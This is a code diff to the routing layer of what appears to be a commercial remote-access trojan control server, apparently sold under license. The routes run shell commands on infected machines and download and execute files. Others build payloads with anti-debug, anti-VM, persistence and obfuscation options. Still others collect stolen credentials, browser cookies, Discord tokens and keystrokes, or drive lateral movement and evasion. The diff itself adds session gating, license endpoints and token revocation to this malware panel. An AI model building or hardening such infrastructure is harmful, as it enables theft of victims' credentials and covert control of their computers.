@@ -36,6 +36,9 @@ var evasionCatalog = evasion.NewManager()
 // SetDB wires the shared database handle. Called once at startup.
 func SetDB(d *sqlx.DB) {
 	db = d
+	if d != nil {
+		hydrateSeats()
+	}
 }
 
 func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager, lateralMgr interface{}, evasionMgr interface{}, wsHub *ws.Hub, config interface{}) {
@@ -44,80 +47,79 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 		// Auth
 		api.POST("/auth/login", authGuard(), loginHandler)
 		api.POST("/auth/register", authGuard(), registerHandler)
+		api.POST("/auth/recover", authGuard(), recoverHandler)
 		api.POST("/auth/logout", logoutHandler)
 		api.GET("/auth/me", meHandler)
-		api.GET("/operators", listOperatorsHandler)
-		api.GET("/operators/:id", getOperatorHandler)
-		api.GET("/stats", statsHandler(agentMgr, taskQueue))
+		api.POST("/licenses/issue", issueLicenseHandler)
+		api.POST("/licenses/paid", paidLicenseHandler)
 
-		// Agents
-		api.GET("/agents", getAgentsHandler(agentMgr))
-		api.GET("/agents/:id", getAgentHandler(agentMgr))
-		api.DELETE("/agents/:id", deleteAgentHandler(agentMgr))
-		api.PATCH("/agents/:id", updateAgentHandler(agentMgr))
-		api.POST("/agents/:id/shell", executeShellHandler(taskQueue))
-		api.POST("/agents/:id/screenshot", takeScreenshotHandler(taskQueue))
-		api.POST("/agents/:id/sleep", sleepHandler(taskQueue))
-		api.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
-		api.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))
+		op := api.Group("")
+		op.Use(requireSession())
+		{
+			op.GET("/operators", listOperatorsHandler)
+			op.GET("/operators/:id", getOperatorHandler)
+			op.GET("/stats", statsHandler(agentMgr, taskQueue))
 
-		// Tasks
-		api.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
-		api.GET("/tasks/:id", getTaskHandler(taskQueue))
-		api.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))
+			op.GET("/agents", getAgentsHandler(agentMgr))
+			op.GET("/agents/:id", getAgentHandler(agentMgr))
+			op.DELETE("/agents/:id", deleteAgentHandler(agentMgr))
+			op.PATCH("/agents/:id", updateAgentHandler(agentMgr))
+			op.POST("/agents/:id/shell", executeShellHandler(taskQueue))
+			op.POST("/agents/:id/screenshot", takeScreenshotHandler(taskQueue))
+			op.POST("/agents/:id/sleep", sleepHandler(taskQueue))
+			op.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
+			op.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))
 
-		// File Transfers
-		api.GET("/agents/:id/files", getFileTransfersHandler(fileMgr))
-		api.POST("/agents/:id/files/upload", uploadFileHandler(fileMgr))
-		api.POST("/agents/:id/files/download", downloadFileHandler(fileMgr, taskQueue))
-		api.POST("/agents/:id/files/download_exec", downloadExecHandler(fileMgr, taskQueue))
-		api.GET("/agents/:id/files/list", listDirectoryHandler(fileMgr))
-		api.GET("/files/:id/download", downloadStoredFileHandler(fileMgr))
-		api.DELETE("/files/:id", deleteFileTransferHandler(fileMgr))
+			op.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
+			op.GET("/tasks/:id", getTaskHandler(taskQueue))
+			op.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))
 
-		// Payload Builder
-		api.POST("/payloads/build", buildPayloadHandler(fileMgr))
-		api.POST("/payloads/upload", uploadAgentBinaryHandler(fileMgr))
-		api.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
-		api.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
-		api.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))
+			op.GET("/agents/:id/files", getFileTransfersHandler(fileMgr))
+			op.POST("/agents/:id/files/upload", uploadFileHandler(fileMgr))
+			op.POST("/agents/:id/files/download", downloadFileHandler(fileMgr, taskQueue))
+			op.POST("/agents/:id/files/download_exec", downloadExecHandler(fileMgr, taskQueue))
+			op.GET("/agents/:id/files/list", listDirectoryHandler(fileMgr))
+			op.GET("/files/:id/download", downloadStoredFileHandler(fileMgr))
+			op.DELETE("/files/:id", deleteFileTransferHandler(fileMgr))
 
-		// Credentials
-		api.GET("/agents/:id/credentials", getCredentialsHandler)
-		api.GET("/agents/:id/cookies", getCookiesHandler)
-		api.GET("/agents/:id/discord", getDiscordTokensHandler)
-		api.GET("/agents/:id/keystrokes", getKeystrokesHandler)
+			op.POST("/payloads/build", buildPayloadHandler(fileMgr))
+			op.POST("/payloads/upload", uploadAgentBinaryHandler(fileMgr))
+			op.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
+			op.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
+			op.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))
 
-		// Screenshots
-		api.GET("/agents/:id/screenshots", getScreenshotsHandler)
-		api.GET("/screenshots/:id/download", downloadScreenshotHandler)
-		api.DELETE("/screenshots/:id", deleteScreenshotHandler)
+			op.GET("/agents/:id/credentials", getCredentialsHandler)
+			op.GET("/agents/:id/cookies", getCookiesHandler)
+			op.GET("/agents/:id/discord", getDiscordTokensHandler)
+			op.GET("/agents/:id/keystrokes", getKeystrokesHandler)
 
-		// Lateral Movement
-		api.GET("/agents/:id/lateral", listAgentTasksHandler(taskQueue, "lateral"))
-		api.POST("/agents/:id/lateral", executeLateralHandler(taskQueue))
-		api.POST("/agents/:id/lateral/scan", scanNetworkHandler(taskQueue))
-		api.POST("/agents/:id/lateral/pivot", executeLateralHandler(taskQueue))
+			op.GET("/agents/:id/screenshots", getScreenshotsHandler)
+			op.GET("/screenshots/:id/download", downloadScreenshotHandler)
+			op.DELETE("/screenshots/:id", deleteScreenshotHandler)
 
-		// Evasion
-		api.GET("/evasion/techniques", listEvasionTechniquesHandler)
-		api.GET("/agents/:id/evasion", listAgentTasksHandler(taskQueue, "evasion"))
-		api.POST("/agents/:id/evasion", executeEvasionHandler(taskQueue))
-		api.POST("/agents/:id/evasion/run", executeEvasionHandler(taskQueue))
+			op.GET("/agents/:id/lateral", listAgentTasksHandler(taskQueue, "lateral"))
+			op.POST("/agents/:id/lateral", executeLateralHandler(taskQueue))
+			op.POST("/agents/:id/lateral/scan", scanNetworkHandler(taskQueue))
+			op.POST("/agents/:id/lateral/pivot", executeLateralHandler(taskQueue))
 
-		// Modules
-		api.GET("/modules", getModulesHandler)
-		api.GET("/agents/:id/modules", getModulesHandler)
-		api.POST("/modules/load", loadModuleHandler(taskQueue))
-		api.POST("/modules/unload", unloadModuleHandler(taskQueue))
-		api.POST("/agents/:id/modules/load", loadModuleHandler(taskQueue))
-		api.POST("/agents/:id/modules/unload", unloadModuleHandler(taskQueue))
+			op.GET("/evasion/techniques", listEvasionTechniquesHandler)
+			op.GET("/agents/:id/evasion", listAgentTasksHandler(taskQueue, "evasion"))
+			op.POST("/agents/:id/evasion", executeEvasionHandler(taskQueue))
+			op.POST("/agents/:id/evasion/run", executeEvasionHandler(taskQueue))
+
+			op.GET("/modules", getModulesHandler)
+			op.GET("/agents/:id/modules", getModulesHandler)
+			op.POST("/modules/load", loadModuleHandler(taskQueue))
+			op.POST("/modules/unload", unloadModuleHandler(taskQueue))
+			op.POST("/agents/:id/modules/load", loadModuleHandler(taskQueue))
+			op.POST("/agents/:id/modules/unload", unloadModuleHandler(taskQueue))
+		}
 	}
 
 	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
 	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
-	r.POST("/agent", agentHTTPBeaconHandler(agentMgr))
-	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr, taskQueue))
+	r.POST("/agent", agentGate(), agentHTTPBeaconHandler(agentMgr))
+	r.POST("/beacon", agentGate(), agentHTTPDataTaskHandler(agentMgr, taskQueue))
 
 	// Health on the public API port — Railway/Render hit this via $PORT.
 	r.GET("/health", func(c *gin.Context) {
@@ -128,20 +130,30 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	// Path is /ws/agent so it never collides with POST /agent.
 	if wsHub != nil {
 		r.GET("/ws/agent", gin.WrapH(http.HandlerFunc(wsHub.HandleAgentWS)))
-		r.GET("/ws", gin.WrapH(http.HandlerFunc(wsHub.HandleOperatorWS)))
+		r.GET("/ws", func(c *gin.Context) {
+			tok := strings.TrimSpace(c.Query("token"))
+			if tok == "" {
+				tok = strings.TrimSpace(strings.TrimPrefix(c.GetHeader("Authorization"), "Bearer "))
+			}
+			if _, ok := lookupToken(tok); !ok {
+				c.JSON(http.StatusUnauthorized, gin.H{"error": "not logged in"})
+				return
+			}
+			wsHub.HandleOperatorWS(c.Writer, c.Request)
+		})
 	}
 }
 
 func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		var msg struct {
-			Type     string `json:"type"`
-			HwID     string `json:"hw_id"`
-			Data     string `json:"data"`
-			Title    string `json:"window_title"`
-			TaskID   string `json:"task_id"`
-			Code     int    `json:"code"`
-			Output   string `json:"output"`
+			Type   string `json:"type"`
+			HwID   string `json:"hw_id"`
+			Data   string `json:"data"`
+			Title  string `json:"window_title"`
+			TaskID string `json:"task_id"`
+			Code   int    `json:"code"`
+			Output string `json:"output"`
 		}
 		if err := c.ShouldBindJSON(&msg); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
@@ -205,6 +217,8 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gi
 }
 
 func logoutHandler(c *gin.Context) {
+	tok := strings.TrimSpace(strings.TrimPrefix(c.GetHeader("Authorization"), "Bearer "))
+	revokeToken(tok)
 	c.JSON(http.StatusOK, gin.H{"message": "Logged out"})
 }
 
@@ -746,19 +760,19 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			normalizePayloadTLS(&cfg)
 		} else {
 			var body struct {
-				ServerHost        string `json:"ServerHost"`
-				ServerPort        int    `json:"ServerPort"`
-				C2Host            string `json:"c2_host"`
-				C2Port            any    `json:"c2_port"`
-				Platform          string `json:"Platform"`
-				Arch              string `json:"Arch"`
-				Obfuscation       bool   `json:"Obfuscation"`
-				AntiDebug         bool   `json:"AntiDebug"`
-				AntiVM            bool   `json:"AntiVM"`
-				SleepObfuscation  bool   `json:"SleepObfuscation"`
-				EncryptionKey     string `json:"EncryptionKey"`
-				UseTLS            *bool  `json:"use_tls"`
-				CustomConfig      string `json:"CustomConfig"`
+				ServerHost       string `json:"ServerHost"`
+				ServerPort       int    `json:"ServerPort"`
+				C2Host           string `json:"c2_host"`
+				C2Port           any    `json:"c2_port"`
+				Platform         string `json:"Platform"`
+				Arch             string `json:"Arch"`
+				Obfuscation      bool   `json:"Obfuscation"`
+				AntiDebug        bool   `json:"AntiDebug"`
+				AntiVM           bool   `json:"AntiVM"`
+				SleepObfuscation bool   `json:"SleepObfuscation"`
+				EncryptionKey    string `json:"EncryptionKey"`
+				UseTLS           *bool  `json:"use_tls"`
+				CustomConfig     string `json:"CustomConfig"`
 			}
 			if err := c.ShouldBindJSON(&body); err != nil {
 				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON: " + err.Error()})
@@ -942,19 +956,19 @@ func uploadAgentBinaryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 }
 
 type PayloadConfig struct {
-	C2Host         string `json:"c2_host"`
-	C2Port         string `json:"c2_port"`
-	UseTLS         bool   `json:"use_tls"`
-	Key            string `json:"key"`
-	HMACKey        string `json:"hmac_key"`
-	SleepInterval  int    `json:"sleep_interval"`
-	Jitter         int    `json:"jitter"`
-	Persistence    bool   `json:"persistence"`
-	HideConsole    bool   `json:"hide_console"`
-	AntiDebug      bool   `json:"anti_debug"`
-	AntiVM         bool   `json:"anti_vm"`
+	C2Host          string `json:"c2_host"`
+	C2Port          string `json:"c2_port"`
+	UseTLS          bool   `json:"use_tls"`
+	Key             string `json:"key"`
+	HMACKey         string `json:"hmac_key"`
+	SleepInterval   int    `json:"sleep_interval"`
+	Jitter          int    `json:"jitter"`
+	Persistence     bool   `json:"persistence"`
+	HideConsole     bool   `json:"hide_console"`
+	AntiDebug       bool   `json:"anti_debug"`
+	AntiVM          bool   `json:"anti_vm"`
 	InjectionMethod string `json:"injection_method"`
-	Platform       string `json:"platform"` // "windows" or "linux"
+	Platform        string `json:"platform"` // "windows" or "linux"
 }
 
 func writableRoot(preferred string) string {
